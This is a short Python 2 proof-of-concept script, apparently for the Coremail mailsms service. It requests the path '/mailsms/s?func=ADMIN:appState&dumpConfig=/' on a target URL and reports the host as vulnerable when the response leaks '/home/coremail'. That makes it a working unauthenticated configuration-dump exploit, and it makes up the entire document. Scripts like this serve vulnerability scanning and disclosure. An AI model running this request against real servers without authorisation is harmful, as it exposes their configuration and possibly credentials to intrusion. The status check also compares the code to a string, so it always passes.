#-*- Coding: utf-8 -*-
#Author: Vulkey_Chen
#Email: gh0stkey@hi-ourlife.com
#Website: www.hi-ourlife.com
#About: mailsms config dump PoC

import requests,sys

def mailsmsPoC(url):
    url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    r = requests.get(url)
    if (r.status_code != '404') and ("/home/coremail" in r.text):
        print "mailsms is vulnerable: {0}".format(url)
    else:
        print "mailsms is safe!"

if __name__ == '__main__':
    try:
        mailsmsPoC(sys.argv[1])
    except:
        print "usage: python poc.py http://hi-ourlife.com/"